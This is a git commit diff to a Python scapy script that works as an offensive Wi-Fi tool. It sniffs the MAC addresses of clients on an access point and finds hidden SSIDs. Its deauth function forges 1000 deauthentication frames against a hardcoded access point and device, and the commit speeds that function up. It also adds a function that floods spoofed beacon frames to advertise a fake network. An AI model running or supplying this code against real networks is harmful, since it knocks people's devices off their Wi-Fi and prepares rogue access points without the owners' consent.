359475cd5eca645a571534c7cb4f0dedbdfe5da2
pip <reevesrs24@gmail.com>
2018-04-06 23:00:53 -0500

    scapy add

--- net_tool.py
+++ net_tool.py
@@ -3,7 +3,7 @@ import os
 from scapy.all import *
 
 interface= "wlx00c0ca84aba2"
-ap_mac = "94:53:30:ed:7f:0a"
+ap_mac = "2c:30:33:65:bd:93"
 device_mac = "60:be:b5:f0:23:b1"
 macAddresses = []
 probeReqs = []
@@ -24,14 +24,12 @@ def sniff_all_mac_addresses(pkt):
 
 	if pkt.haslayer(Dot11):
 		layer = pkt.getlayer(Dot11)
-		
 		if layer.addr2 and (layer.addr2 not in macAddresses) and layer.addr1 == ap_mac:
 			macAddresses.append(layer.addr2)
 			print "[+] Detected new mac address: " + layer.addr2
 
 def find_hidden_ap(pkt):
 	
-
 	if pkt.haslayer(Dot11ProbeResp):
 		addr2 = pkt.getlayer(Dot11).addr2
 		if (addr2 in hidden_aps) and (addr2 not in aps):
@@ -39,6 +37,7 @@ def find_hidden_ap(pkt):
 			print '[+]' + name + ' ' + addr2
 			aps.append(addr2)
 	if pkt.haslayer(Dot11Beacon):
+		print pkt.summary()
 		if pkt.getlayer(Dot11).info == '':
 			addr2 = pkt.getlayer(Dot11).addr2
 			if addr2 not in hidden_aps:
@@ -56,13 +55,16 @@ def get_all_mac_addresses():
 def deauth_device():
 	print "deauthing.."
 	pkt = RadioTap() / Dot11( addr1=ap_mac, addr2=device_mac, addr3=device_mac) / Dot11Deauth() 
-	sendp(pkt, iface=interface, count=1000, inter=1)
+	sendp(pkt, iface=interface, count=1000, inter=.1)
 
 
 def find_all_hidden_aps():
 	print "finding hidden ap's.."
 	sniff(iface=interface, prn=find_hidden_ap)
 
+def create_ap():
+	pkt = RadioTap() / Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2='00:c0:ca:84:ab:a2', addr3='00:c0:ca:84:ab:a2') / Dot11Beacon(cap=0x1100) / Dot11Elt(ID=0, info="YO") / Dot11Elt(ID=1, info ="\x82\x84\x8b\x96\x24\x30\x48\x6c") / Dot11Elt(ID=3, info="\x0b") / Dot11Elt(ID=5, info="\x00\x01\x00\x00")
+	sendp(pkt, iface=interface, count = 10000, inter=.2)
 
 def setup_nic():
 	os.system('sudo ifconfig ' + interface + ' down')
@@ -80,6 +82,8 @@ def main():
 		setup_nic()
 	elif sys.argv[1] == '-h':
 		find_all_hidden_aps()
+	elif sys.argv[1] == '-ap':
+		create_ap()
 
 if __name__ == "__main__":
     main()
